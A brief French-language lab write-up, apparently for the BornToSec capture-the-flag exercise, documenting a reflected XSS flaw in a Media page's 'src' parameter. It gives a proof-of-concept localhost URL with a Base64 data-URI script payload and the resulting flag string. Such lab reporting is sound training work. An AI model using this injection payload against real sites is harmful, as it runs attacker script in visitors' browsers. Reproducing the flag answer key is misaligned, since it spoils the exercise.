# Audit de Sécurité : BornToSec - Faille XSS Réfléchie (Media)

## 1. Description de la vulnérabilité
Une faille **XSS Réfléchie** (Cross-Site Scripting) a été identifiée sur la page **Media**. L'application accepte des données encodées en Base64 via le paramètre `src` de l'URL sans validation rigoureuse. Cela permet à un attaquant de forcer le navigateur à exécuter du code JavaScript arbitraire.

## 2. Preuve d'exploitation (PoC)
L'attaque a été réalisée sur l'environnement local (`localhost`) en injectant un script encodé dans l'URL.

**URL utilisée :**
`http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

**Résultat :**
L'exécution réussie du script a permis d'afficher le flag de sécurité directement sur la page.

**Capture d'écran du Flag :**
<img width="1833" height="888" alt="image" src="https://github.com/user-attachments/assets/557daa5a-39ee-4e6a-9b5c-17ceabe48c74" />

> **Flag obtenu :** `928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D`

